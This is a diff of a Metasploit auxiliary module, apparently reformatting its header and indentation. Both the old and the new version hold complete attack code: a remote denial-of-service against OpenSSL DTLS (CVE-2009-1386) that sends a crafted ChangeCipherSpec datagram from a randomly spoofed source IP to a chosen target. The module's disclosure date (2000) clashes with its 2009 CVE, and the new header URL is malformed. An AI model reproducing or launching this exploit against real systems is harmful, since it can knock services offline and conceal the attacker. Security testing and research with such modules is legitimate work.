@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 
@@ -10,46 +8,46 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Auxiliary::Dos
-	include Msf::Exploit::Capture
-	include Exploit::Remote::Tcp
+  include Msf::Auxiliary::Dos
+  include Msf::Exploit::Capture
+  include Exploit::Remote::Tcp
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'		=> 'OpenSSL < 0.9.8i DTLS ChangeCipherSpec Remote DoS',
-			'Description'	=> %q{
-					This module performs a Denial of Service Attack against Datagram TLS in OpenSSL
-				version 0.9.8i and earlier. OpenSSL crashes under these versions when it recieves a
-				ChangeCipherspec Datagram before a ClientHello.
-			},
-			'Author'	=> [
-						'Jon Oberheide <jon[at]oberheide.org>', #original code
-						'theLightCosine' # metasploit module
-						],
-			'License'        => MSF_LICENSE,
-			'References'     =>
-				[
-					[ 'CVE', '2009-1386' ],
-					[ 'OSVDB', '55073'],
-				],
-			'DisclosureDate' => 'Apr 26 2000'))
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'		=> 'OpenSSL < 0.9.8i DTLS ChangeCipherSpec Remote DoS',
+      'Description'	=> %q{
+          This module performs a Denial of Service Attack against Datagram TLS in OpenSSL
+        version 0.9.8i and earlier. OpenSSL crashes under these versions when it recieves a
+        ChangeCipherspec Datagram before a ClientHello.
+      },
+      'Author'	=> [
+            'Jon Oberheide <jon[at]oberheide.org>', #original code
+            'theLightCosine' # metasploit module
+            ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2009-1386' ],
+          [ 'OSVDB', '55073'],
+        ],
+      'DisclosureDate' => 'Apr 26 2000'))
 
-		deregister_options('FILTER','PCAPFILE', 'INTERFACE', 'SNAPLEN', 'TIMEOUT')
-	end
+    deregister_options('FILTER','PCAPFILE', 'INTERFACE', 'SNAPLEN', 'TIMEOUT')
+  end
 
-	def run
-		open_pcap
-		print_status("Creating DTLS ChangeCipherSpec Datagram...")
-		p = PacketFu::UDPPacket.new
-		p.ip_daddr = datastore['RHOST']
-		p.ip_src = rand(0x100000000)
-		p.ip_ttl = 44
-		p.udp_sport = 34060
-		p.udp_dport = datastore['RPORT'].to_i
-		p.payload = "\x14\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01"
-		p.recalc
-		print_status("Sending Datagram to target...")
-		capture_sendto(p, '255.255.255.255')
-		close_pcap
-	end
+  def run
+    open_pcap
+    print_status("Creating DTLS ChangeCipherSpec Datagram...")
+    p = PacketFu::UDPPacket.new
+    p.ip_daddr = datastore['RHOST']
+    p.ip_src = rand(0x100000000)
+    p.ip_ttl = 44
+    p.udp_sport = 34060
+    p.udp_dport = datastore['RPORT'].to_i
+    p.payload = "\x14\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01"
+    p.recalc
+    print_status("Sending Datagram to target...")
+    capture_sendto(p, '255.255.255.255')
+    close_pcap
+  end
 end
